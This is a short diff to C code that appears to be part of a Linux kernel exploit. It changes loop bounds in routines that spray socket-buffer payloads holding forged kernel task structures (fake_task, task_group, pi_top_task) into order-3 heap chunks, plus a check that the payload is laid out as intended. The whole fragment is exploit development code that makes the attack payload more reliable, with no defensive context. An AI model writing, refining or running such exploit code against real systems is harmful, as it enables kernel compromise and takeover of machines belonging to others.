@@ -1115,7 +1115,9 @@ int prepare_skb_payload(uintptr_t base, int payload_mode) {
   task_group = fake_task;
   pi_top_task = fake_task;
 
-  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
+  for (size_t chunk = 0;
+       chunk + (size_t)SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
+       chunk += ORDER3_SIZE) {
     unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
 
     put32(p, LOCK_OFF + 0x00, 0);
@@ -1582,8 +1584,10 @@ int s2_payload_contract_ok(void) {
     return 0;
   }
 
-  for (size_t chunk = 0; chunk < SKB_SEND_SIZE; chunk += ORDER3_SIZE) {
-    const unsigned char *p = skb_buf + chunk;
+  for (size_t chunk = 0;
+       chunk + (size_t)SKB_FRAG_BIAS + ORDER3_SIZE <= SKB_SEND_SIZE;
+       chunk += ORDER3_SIZE) {
+    const unsigned char *p = skb_buf + chunk + SKB_FRAG_BIAS;
     uint64_t got64;
     uint32_t got32;
 
